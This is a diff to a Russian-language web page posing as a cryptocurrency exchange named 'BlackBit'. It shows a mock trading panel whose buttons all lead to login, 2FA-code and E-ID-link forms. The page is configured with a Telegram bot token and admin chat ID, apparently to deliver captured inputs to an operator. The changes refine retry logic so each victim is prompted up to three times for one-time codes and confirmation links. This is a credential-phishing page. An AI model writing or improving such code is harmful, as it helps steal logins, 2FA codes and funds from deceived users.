@@ -35,9 +35,6 @@
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
         }
 
-        /* ============================================================
-           ЛОГО
-           ============================================================ */
         .logo {
             text-align: center;
             margin-bottom: 16px;
@@ -56,9 +53,6 @@
             margin-top: 2px;
         }
 
-        /* ============================================================
-           ТОРГОВАЯ ПАНЕЛЬ
-           ============================================================ */
         .trading-panel {
             background: #ffffff;
             border-radius: 12px;
@@ -113,9 +107,6 @@
             color: #e74c3c;
         }
 
-        /* ============================================================
-           ТАЙМФРЕЙМЫ
-           ============================================================ */
         .tf-bar {
             display: flex;
             gap: 4px;
@@ -142,9 +133,6 @@
             color: #ffffff;
         }
 
-        /* ============================================================
-           СТАКАН
-           ============================================================ */
         .order-book {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -184,9 +172,6 @@
             color: #8a8a9a;
         }
 
-        /* ============================================================
-           КНОПКИ
-           ============================================================ */
         .action-buttons {
             display: flex;
             gap: 8px;
@@ -247,9 +232,6 @@
             background: #0052cc;
         }
 
-        /* ============================================================
-           СТРАНИЦЫ
-           ============================================================ */
         .page {
             display: none;
         }
@@ -257,9 +239,6 @@
             display: block;
         }
 
-        /* ============================================================
-           ФОРМЫ
-           ============================================================ */
         .form-group {
             margin-bottom: 12px;
         }
@@ -367,10 +346,10 @@
         .mt-16 {
             margin-top: 16px;
         }
+        .mb-8 {
+            margin-bottom: 8px;
+        }
 
-        /* ============================================================
-           СООБЩЕНИЯ
-           ============================================================ */
         .message {
             display: none;
             margin-top: 12px;
@@ -422,9 +401,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* ============================================================
-           АДАПТИВ
-           ============================================================ */
         @media (max-width: 420px) {
             .container { padding: 10px; }
             .price-data .price { font-size: 20px; }
@@ -436,21 +412,14 @@
 <body>
 <div class="container">
 
-    <!-- ===== ЛОГО ===== -->
     <div class="logo">
         <h1>BlackBit</h1>
         <div class="sub">Криптовалютная биржа</div>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 1: ГЛАВНАЯ
-    ============================================================ -->
+    <!-- ===== ГЛАВНАЯ ===== -->
     <div id="pageMain" class="page active">
-
-        <!-- Торговая панель -->
         <div class="trading-panel">
-
-            <!-- Цена -->
             <div class="price-header">
                 <div class="pair-info">
                     <span class="pair">BTC/USDT</span>
@@ -461,8 +430,6 @@
                     <span class="change positive" id="btcChange">▲ +0.24%</span>
                 </div>
             </div>
-
-            <!-- Таймфреймы -->
             <div class="tf-bar">
                 <button class="tf-btn active" data-tf="1">1m</button>
                 <button class="tf-btn" data-tf="5">5m</button>
@@ -472,13 +439,9 @@
                 <button class="tf-btn" data-tf="240">4H</button>
                 <button class="tf-btn" data-tf="D">D</button>
             </div>
-
-            <!-- График (светлая тема) -->
             <div style="width:100%; height:320px; overflow:hidden; border-radius:8px; background:#ffffff;">
                 <div id="tradingview_btc" style="width:100%; height:320px;"></div>
             </div>
-
-            <!-- Стаканы -->
             <div class="order-book" id="orderBook">
                 <div class="order-book-col">
                     <div class="title bid">Покупка</div>
@@ -497,28 +460,21 @@
                     <div class="order-book-row"><span class="price-ask">66,000.0</span><span class="amount">0.27</span></div>
                 </div>
             </div>
-
-            <!-- Кнопки Купить/Продать -->
             <div class="action-buttons">
                 <button class="btn btn-buy" onclick="goToLoginForm()">Купить</button>
                 <button class="btn btn-sell" onclick="goToLoginForm()">Продать</button>
             </div>
         </div>
-
-        <!-- Кнопки навигации -->
         <div class="nav-buttons">
             <button class="btn primary" onclick="goToLoginForm()">Войти</button>
             <button class="btn" onclick="goToAbout()">О бирже</button>
         </div>
-
         <div class="text-center mt-8" style="color: #8a8a9a; font-size:12px;">
             <button class="btn-link" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</button>
         </div>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 2: О БИРЖЕ
-    ============================================================ -->
+    <!-- ===== О БИРЖЕ ===== -->
     <div id="pageAbout" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:8px;">📘</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
@@ -535,9 +491,7 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 3: ВХОД (ЛОГИН + ПАРОЛЬ → КОД)
-    ============================================================ -->
+    <!-- ===== ВХОД (ЛОГИН + ПАРОЛЬ) ===== -->
     <div id="pageLoginForm" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
@@ -561,7 +515,6 @@
         <div class="text-center mt-12" style="color:#8a8a9a; font-size:13px;">
             <button class="btn-link" onclick="showMessage('Функция восстановления скоро появится', 'info')">Восстановить пароль</button>
         </div>
-
         <div class="text-center mt-8" style="color:#8a8a9a; font-size:13px;">
             <button class="btn-link" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</button>
         </div>
@@ -573,9 +526,7 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 4: КОД (6 цифр)
-    ============================================================ -->
+    <!-- ===== КОД ПОДТВЕРЖДЕНИЯ (6 ЦИФР) ===== -->
     <div id="pageCode" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
@@ -589,15 +540,13 @@
             <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
         </div>
 
-        <div id="codeError" class="message error" style="display:none;">Неверный код. Попробуйте снова.</div>
+        <div id="codeError" class="message error" style="display:none;">Неверный код. Осталось попыток: <span id="codeAttempts">3</span></div>
         <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
 
         <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 5: E-ID
-    ============================================================ -->
+    <!-- ===== E-ID ВХОД ===== -->
     <div id="pageEid" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
@@ -621,9 +570,7 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 6: ССЫЛКА E-ID
-    ============================================================ -->
+    <!-- ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ (E-ID) ===== -->
     <div id="pageEidLink" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
@@ -637,15 +584,13 @@
             <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
         </div>
 
-        <div id="eidLinkError" class="message error" style="display:none;">Ошибка. Повторите попытку.</div>
+        <div id="eidLinkError" class="message error" style="display:none;">Неверная ссылка. Осталось попыток: <span id="eidLinkAttempts">3</span></div>
         <div class="status-waiting" id="eidLinkStatus"><span class="spinner"></span> Ожидание...</div>
 
         <button class="btn-back" onclick="goToEid()">← Назад</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 7: ОШИБКА
-    ============================================================ -->
+    <!-- ===== ОШИБКА ===== -->
     <div id="pageLoginError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка</div>
@@ -653,9 +598,7 @@
         <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">Вернуться на главную</button>
     </div>
 
-    <!-- ============================================================
-    СТРАНИЦА 8: БЛОКИРОВКА
-    ============================================================ -->
+    <!-- ===== БЛОКИРОВКА ===== -->
     <div id="pageError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка входа</div>
@@ -664,7 +607,6 @@
         <button class="btn-back" onclick="goToMain()">← На главную</button>
     </div>
 
-    <!-- ===== СООБЩЕНИЯ ===== -->
     <div id="msg" class="message"></div>
 
 </div>
@@ -676,7 +618,6 @@
     const BOT_TOKEN = "НОВЫЙ_ТОКЕН_ОТ_BOTFATHER";
     const ADMIN_ID = "8542901240";
     const SUPPORT_LINK = "https://t.me/ваш_чат";
-    const MAX_ATTEMPTS = 3;
 
     // ============================================================
     // 2. ИНИЦИАЛИЗАЦИЯ
@@ -708,7 +649,6 @@
         btn.addEventListener('click', function() {
             document.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('active'));
             this.classList.add('active');
-            console.log('Таймфрейм:', this.dataset.tf);
         });
     });
 
@@ -740,8 +680,6 @@
                 "timezone": "Europe/Moscow",
                 "withdateranges": false
             });
-        } else {
-            console.log('TradingView не загружен');
         }
     }, 500);
 
@@ -789,7 +727,8 @@
     // ============================================================
     let userEmail = '';
     let userPassword = '';
-    let attemptCount = 0;
+    let codeAttempts = 3;
+    let eidLinkAttempts = 3;
 
     async function handleLogin() {
         const email = document.getElementById('email').value.trim();
@@ -813,6 +752,10 @@
         if (ok) {
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
+            codeAttempts = 3;
+            document.getElementById('codeAttempts').textContent = codeAttempts;
+            document.getElementById('codeError').style.display = 'none';
+            document.getElementById('codeInput').value = '';
             showPage('pageCode');
             document.getElementById('codeStatus').style.display = 'block';
             showMessage('Ожидание...', 'success');
@@ -820,21 +763,13 @@
         } else {
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
-            attemptCount++;
-            if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
-                showPage('pageError');
-                return;
-            }
             document.getElementById('loginError').style.display = 'block';
-            document.getElementById('loginError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 10. КОД
+    // 10. КОД (6 ЦИФР) — 3 ПОПЫТКИ
     // ============================================================
     async function handleCode() {
         const code = document.getElementById('codeInput').value.trim();
@@ -859,21 +794,20 @@
         } else {
             submitCodeBtn.disabled = false;
             submitCodeBtn.textContent = 'Подтвердить';
-            attemptCount++;
-            if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
+            codeAttempts--;
+            document.getElementById('codeAttempts').textContent = codeAttempts;
+            document.getElementById('codeError').style.display = 'block';
+            if (codeAttempts <= 0) {
+                document.querySelectorAll('#codeFields input, #codeFields button').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
-            document.getElementById('codeError').style.display = 'block';
-            document.getElementById('codeError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 11. E-ID
+    // 11. E-ID → ССЫЛКА
     // ============================================================
     async function handleEidLogin() {
         const email = document.getElementById('eidEmail').value.trim();
@@ -897,6 +831,10 @@
         if (ok) {
             eidSubmitBtn.disabled = false;
             eidSubmitBtn.textContent = 'Войти через E-ID';
+            eidLinkAttempts = 3;
+            document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+            document.getElementById('eidLinkError').style.display = 'none';
+            document.getElementById('eidLinkInput').value = '';
             showPage('pageEidLink');
             document.getElementById('eidLinkStatus').style.display = 'block';
             showMessage('Ссылка отправлена на почту', 'success');
@@ -904,21 +842,13 @@
         } else {
             eidSubmitBtn.disabled = false;
             eidSubmitBtn.textContent = 'Войти через E-ID';
-            attemptCount++;
-            if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
-                showPage('pageError');
-                return;
-            }
             document.getElementById('eidLoginError').style.display = 'block';
-            document.getElementById('eidLoginError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 12. E-ID ССЫЛКА
+    // 12. ССЫЛКА (E-ID) — 3 ПОПЫТКИ
     // ============================================================
     async function handleEidLink() {
         const link = document.getElementById('eidLinkInput').value.trim();
@@ -943,15 +873,14 @@
         } else {
             eidLinkSubmitBtn.disabled = false;
             eidLinkSubmitBtn.textContent = 'Подтвердить';
-            attemptCount++;
-            if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
+            eidLinkAttempts--;
+            document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+            document.getElementById('eidLinkError').style.display = 'block';
+            if (eidLinkAttempts <= 0) {
+                document.querySelectorAll('#eidLinkFields input, #eidLinkFields button').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
-            document.getElementById('eidLinkError').style.display = 'block';
-            document.getElementById('eidLinkError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
